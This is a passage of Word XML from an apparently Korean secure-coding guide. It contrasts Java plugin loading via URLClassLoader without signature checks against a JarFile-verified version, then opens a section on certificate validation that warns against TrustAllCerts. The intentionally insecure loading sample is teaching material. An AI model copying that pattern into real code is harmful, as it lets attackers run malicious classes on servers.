            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>로드</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>URLClassLoader loader = new URLClassLoader(new URL[]{new URL(jarUrl)});</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">Class&lt;?&gt; cls = loader.loadClass("com.example.Plugin");  // </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>서명</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>미검증</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="002B1872">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFF2CC"/>
          </w:tcPr>
          <w:p w:rsidR="002B1872" w:rsidRDefault="00913677">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>위험</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">] </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>서명</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>검증</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>없이</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>외부</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> JAR</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>를</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>로드하면</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>공격자가</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>정상</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>플러그인</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>파일을</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>악성</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>버전으로</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>교체해도</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>탐지하지</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>못합니다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">. </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>악성</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>클래스가</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>서버</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> JVM </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>위에서</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>실행되어</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>데이터</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>탈취</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>백도어</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>설치</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>서버</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>완전</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>장악이</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>가능합니다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pP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9122"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B30C6E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E2EFDA"/>
          </w:tcPr>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>안전한</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>코드</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>예</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>// [</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>안전</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>] JarFile</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>로</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>서명</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>항목</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>검증</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>후</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>사용</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>JarFile jar = new JarFile(jarFile, true);  // verify=true</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>JarEntry entry = jar.getJarEntry("com/example/Plugin.class");</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>Certificate[] certs = entry.getCertificates();</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>if (certs == null || certs.length == 0) throw new SecurityException("</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>서명</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>없음</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>");</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E"/>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
      <w:pPr>
        <w:pStyle w:val="21"/>
        <w:rPr>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">  11. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>부적절한</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>인증서</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>유효성</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>검증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9122"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B30C6E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFF2CC"/>
          </w:tcPr>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="1F3564"/>
                <w:sz w:val="18"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="1F3564"/>
                <w:sz w:val="18"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>준수사항</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="1F3564"/>
                <w:sz w:val="18"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:ind w:left="170"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">• </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>인증서</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> Common Name</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>과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실제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호스트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일치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여부</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>유효기간</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>해지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여부</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">, CA </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>서명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여부를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검증한다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:ind w:left="170"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">• SSL </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>인증서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검증을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비활성화하는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코드</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">(TrustAllCerts </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>등</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>)</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>를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사용하지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않는다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
